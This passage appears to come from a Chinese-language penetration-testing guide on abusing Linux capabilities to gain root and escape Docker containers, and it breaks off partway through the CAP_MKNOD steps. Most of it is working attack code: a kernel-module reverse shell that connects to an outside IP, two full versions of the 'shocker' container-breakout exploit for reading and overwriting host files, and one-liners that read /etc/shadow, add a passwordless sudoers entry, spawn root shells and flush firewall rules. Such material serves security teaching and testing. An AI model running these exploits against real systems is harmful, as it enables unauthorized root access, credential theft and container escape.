您可以使用以下命令检查 Docker 容器中启用的能力：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在上面的输出中，您可以看到已启用了**SYS\_MODULE**功能。

**创建**一个将执行反向shell的**内核模块**，并创建**Makefile**来**编译**它：

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
在 Makefile 中，每个 make 单词前的空格必须是制表符，而不是空格！
{% endhint %}

执行 `make` 命令进行编译。
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
最后，在一个shell中启动`nc`并从另一个shell中**加载模块**，然后你将捕获到`nc`进程中的shell：
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**这种技术的代码是从**[**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **的"滥用SYS\_MODULE能力"实验室中复制的**

这种技术的另一个例子可以在[https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)中找到

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html)允许进程**绕过文件读取和目录读取执行权限**。虽然它被设计用于搜索或读取文件，但它也授予进程使用`open_by_handle_at(2)`的权限。任何具有`CAP_DAC_READ_SEARCH`能力的进程都可以使用`open_by_handle_at(2)`来访问任何文件，甚至是在其挂载命名空间之外的文件。传递给`open_by_handle_at(2)`的句柄是一个不透明的标识符，可以使用`name_to_handle_at(2)`检索。然而，这个句柄包含敏感且可篡改的信息，比如inode号。Sebastian Krahmer首次在Docker容器中展示了这个问题，使用了[shocker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)漏洞利用。

**这意味着你可以绕过文件读取权限检查和目录读取/执行权限检查。**

**使用二进制文件的例子**

该二进制文件将能够读取任何文件。因此，如果像tar这样的文件具有这个能力，它将能够读取shadow文件：
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**使用binary2的示例**

在这种情况下，假设**`python`**二进制文件具有此能力。为了列出根目录下的文件，你可以执行以下操作：
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
而要读取一个文件，你可以执行以下操作：
```python
print(open("/etc/shadow", "r").read())
```
**环境中的示例（Docker越狱）**

您可以使用以下命令检查Docker容器中启用的能力：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在先前的输出中，您可以看到启用了**DAC\_READ\_SEARCH**权限。因此，容器可以**调试进程**。

您可以在[https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)中了解以下利用方式，但简而言之，**CAP\_DAC\_READ\_SEARCH**不仅允许我们在没有权限检查的情况下遍历文件系统，还明确删除了对**open\_by\_handle\_at(2)**的任何检查，并且**可能允许我们的进程访问其他进程打开的敏感文件**。

滥用这些权限以从主机读取文件的原始利用方式可以在此处找到：[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)，以下是一个**修改后的版本，允许您指定要读取的文件作为第一个参数，并将其转储到文件中**。
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
我需要利用一个指针来找到主机上挂载的某个文件。原始的利用代码使用的是 /.dockerinit 文件，而这个修改后的版本使用的是 /etc/hostname 文件。如果利用代码不起作用，可能需要设置一个不同的文件。要找到在主机上挂载的文件，只需执行 mount 命令：
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**这个技术的代码是从 "Abusing DAC\_READ\_SEARCH Capability" 实验室中复制的** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的网络安全活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士在各个领域的热点交流之地。

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**这意味着您可以绕过对任何文件的写入权限检查，因此可以写入任何文件。**

有很多文件可以**覆盖以提升权限**，[**您可以从这里获取一些想法**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**使用二进制文件的示例**

在这个示例中，vim 具有这个能力，所以您可以修改任何文件，如 passwd、sudoers 或 shadow：
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**二进制文件2的示例**

在这个示例中，**`python`**二进制文件将具有此能力。您可以使用python来覆盖任何文件：
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**使用环境变量和CAP_DAC_READ_SEARCH（Docker越狱）的示例**

您可以使用以下命令检查Docker容器中启用的能力：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
首先阅读前一节中关于滥用 DAC_READ_SEARCH 权限来读取任意文件的内容，并编译该漏洞利用工具。
然后，编译以下版本的 shocker 漏洞利用工具，它将允许您在主机文件系统中写入任意文件：
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
为了逃离Docker容器，你可以从主机上**下载**文件`/etc/shadow`和`/etc/passwd`，**添加**一个**新用户**，并使用**`shocker_write`**来覆盖它们。然后，通过**ssh**进行**访问**。

**这个技术的代码是从**[**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)**的"Abusing DAC\_OVERRIDE Capability"实验室中复制的**

## CAP\_CHOWN

**这意味着可以更改任何文件的所有权。**

**使用二进制文件的示例**

假设**`python`**二进制文件具有此能力，你可以**更改**`shadow`文件的**所有者**，**更改root密码**，并提升权限：
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
或者使用具有此能力的 **`ruby`** 二进制文件：
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**这意味着可以更改任何文件的权限。**

**使用二进制文件的示例**

如果Python具有此能力，您可以修改shadow文件的权限，**更改root密码**并提升特权：
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**这意味着可以设置创建进程的有效用户ID。**

**使用二进制文件的示例**

如果Python具有此**能力**，您可以非常容易地滥用它来提升特权到root：
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**另一种方法：**

```bash
$ getcap -r / 2>/dev/null
```

这个命令将递归地扫描整个文件系统，并显示具有特殊能力的文件。
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**这意味着可以设置创建进程的有效组ID。**

有很多文件可以**覆盖以提升权限**，[**你可以从这里获取一些想法**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**使用二进制文件的示例**

在这种情况下，你应该寻找组可以读取的有趣文件，因为你可以冒充任何组：
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
一旦你找到了一个可以滥用的文件（通过读取或写入），以升级权限，你可以使用以下方法**模拟感兴趣的组来获取一个shell**：
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
在这种情况下，组`shadow`被冒充，因此您可以读取文件`/etc/shadow`：
```bash
cat /etc/shadow
```
如果安装了**docker**，您可以**冒充** **docker组**并滥用它与[docker套接字进行通信并提升权限](./#writable-docker-socket)。

## CAP\_SETFCAP

**这意味着可以在文件和进程上设置能力**

**使用二进制文件的示例**

如果python具有此**能力**，您可以很容易地滥用它来提升为root权限：

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
请注意，如果您使用CAP\_SETFCAP为二进制文件设置了新的能力，则会丢失此能力。
{% endhint %}

一旦您拥有[SETUID能力](linux-capabilities.md#cap\_setuid)，您可以转到其部分以查看如何提升特权。

**使用环境的示例（Docker越狱）**

默认情况下，Docker容器内的进程被赋予了**CAP\_SETFCAP能力**。您可以通过执行以下操作来验证：
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

apsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
这个能力允许将**任何其他能力授予二进制文件**，因此我们可以考虑**滥用本页面中提到的任何其他能力突破**来从容器中**逃脱**。\
然而，如果你尝试给gdb二进制文件赋予CAP\_SYS\_ADMIN和CAP\_SYS\_PTRACE的能力，你会发现你可以给予它们，但是**二进制文件在此之后将无法执行**：
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
经过调查，我读到了这个：_Permitted: 这是一个**限制有效能力的超集**，线程可以假设。它也是一个限制有效集中的线程可以通过一个线程添加到继承集中的能力，该线程**没有CAP\_SETPCAP**能力。_\
看起来，Permitted能力限制了可以使用的能力。\
然而，Docker默认也授予了**CAP\_SETPCAP**，所以你可能能够**在继承集中设置新的能力**。\
然而，在这个能力的文档中：_CAP\_SETPCAP：\[…]**将调用线程的边界集中的任何能力添加到其可继承集**。_\
看起来，我们只能从边界集中添加到可继承集的能力。这意味着**我们不能将新的能力（如CAP\_SYS\_ADMIN或CAP\_SYS\_PTRACE）放入继承集中以提升权限**。

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)提供了一系列敏感操作，包括访问`/dev/mem`、`/dev/kmem`或`/proc/kcore`，修改`mmap_min_addr`，访问`ioperm(2)`和`iopl(2)`系统调用，以及各种磁盘命令。通过这个能力，也启用了`FIBMAP ioctl(2)`，这在[过去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)引起了问题。根据手册，持有者还可以对其他设备**执行一系列特定于设备的操作**。

这对于**提升权限**和**Docker逃逸**很有用。

## CAP\_KILL

**这意味着可以杀死任何进程。**

**使用二进制文件的示例**

假设**`python`**二进制文件具有这个能力。如果你还能**修改一些服务或套接字配置**（或与服务相关的任何配置文件），你可以在其中设置后门，然后杀死与该服务相关的进程，并等待新的配置文件执行你的后门。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**使用 kill 进行权限提升**

如果你拥有 kill 的权限，并且有一个以 root（或其他用户）身份运行的 **node 程序**，你可以尝试向其发送 **SIGUSR1 信号**，从而使其打开 node 调试器，以便你可以连接到它。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
## CAP\_NET\_BIND\_SERVICE

这意味着可以在任何端口上监听（甚至是特权端口）。你不能直接通过这个能力来提升权限。

**使用二进制文件的示例**

如果**`python`**具有这个能力，它将能够在任何端口上监听，甚至从其中连接到任何其他端口（某些服务需要从特定特权端口连接）。

{% tabs %}
{% tab title="监听" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% tab title="连接" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程能够为可用的网络命名空间创建原始和数据包套接字类型。这允许通过公开的网络接口进行任意数据包生成和传输。在许多情况下，此接口将是一个虚拟以太网设备，它可能允许恶意或被入侵的容器在各种网络层次上伪造数据包。具有此能力的恶意进程或被入侵的容器可能会注入上游桥接器，利用容器之间的路由，绕过网络访问控制，并以其他方式干扰主机网络，如果没有防火墙来限制数据包类型和内容。最后，此能力允许进程绑定到可用命名空间中的任何地址。特权容器通常保留此能力，以允许使用原始套接字从容器中创建 ICMP 请求，从而使 ping 功能正常工作。

**这意味着可以嗅探流量**。您不能直接利用此能力升级权限。

**使用二进制文件的示例**

如果二进制文件 **`tcpdump`** 具有此能力，则可以使用它来捕获网络信息。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
请注意，如果**环境**提供了这个能力，您也可以使用**`tcpdump`**来嗅探流量。

**二进制文件2的示例**

以下示例是**`python2`**代码，可用于拦截“**lo**”（**本地主机**）接口的流量。该代码来自实验“_The Basics: CAP-NET\_BIND + NET\_RAW_”（[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)）。
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许持有者在暴露的网络命名空间上**修改防火墙、路由表、套接字权限**、网络接口配置和其他相关设置。这还提供了在连接的网络接口上**启用混杂模式**并可能跨命名空间进行嗅探的能力。

**使用二进制文件的示例**

假设**python二进制文件**具有这些能力。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**这意味着可以修改inode属性。**你不能直接利用这个能力来提升权限。

**使用二进制文件的示例**

如果你发现一个文件是不可变的，并且python具有这个能力，你可以**移除不可变属性并使文件可修改：**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
请注意，通常使用以下方式设置和移除此不可变属性：
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许使用 `chroot(2)` 系统调用。这可能允许通过已知的弱点和逃逸来逃离任何 `chroot(2)` 环境：

* [如何从各种 chroot 解决方案中逃脱](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot 逃逸工具](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许使用 `reboot(2)` 系统调用。它还允许通过 `LINUX_REBOOT_CMD_RESTART2` 在某些特定硬件平台上执行任意的 **reboot 命令**。

此功能还允许使用 `kexec_load(2)` 系统调用，该调用加载一个新的崩溃内核，并且从 Linux 3.17 开始，还有 `kexec_file_load(2)`，它也会加载已签名的内核。

## CAP\_SYSLOG

[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) 在 Linux 2.6.37 中最终从 `CAP_SYS_ADMIN` catchall 中分叉出来，此功能允许进程使用 `syslog(2)` 系统调用。当 `/proc/sys/kernel/kptr_restrict` 设置为 1 时，这也允许进程查看通过 `/proc` 和其他接口暴露的内核地址。

`kptr_restrict` sysctl 设置在 2.6.38 中引入，用于确定是否暴露内核地址。自 2.6.39 起，默认为零（暴露内核地址）在 vanilla 内核中，尽管许多发行版正确地将该值设置为 1（对除 uid 0 之外的所有人隐藏）或 2（始终隐藏）。

此外，此功能还允许进程查看 `dmesg` 输出，如果 `dmesg_restrict` 设置为 1。最后，出于历史原因，仍然允许 `CAP_SYS_ADMIN` 功能执行 `syslog` 操作。

## CAP\_MKNOD

[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许通过允许创建除了常规文件 (`S_IFREG`)、FIFO（命名管道）(`S_IFIFO`) 或 UNIX 域套接字 (`S_IFSOCK`) 之外的其他类型的文件来扩展使用 [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html)。特殊文件类型包括：

* `S_IFCHR`（字符特殊文件（类似终端的设备））
* `S_IFBLK`（块特殊文件（类似磁盘的设备））。

这是一个默认的功能 ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))。

此功能允许在以下条件下在主机上进行特权升级（通过完整磁盘读取）：

1. 初始访问主机（非特权用户）。
2. 初始访问容器（特权用户（EUID 0）和有效 `CAP_MKNOD`）。
3. 主机和容器应共享相同的用户命名空间。

**步骤：**

1. 作为标准用户在主机上执行以下操作：
   1. 获取当前 UID (`id`)。例如：`uid=1000(unprivileged)`。
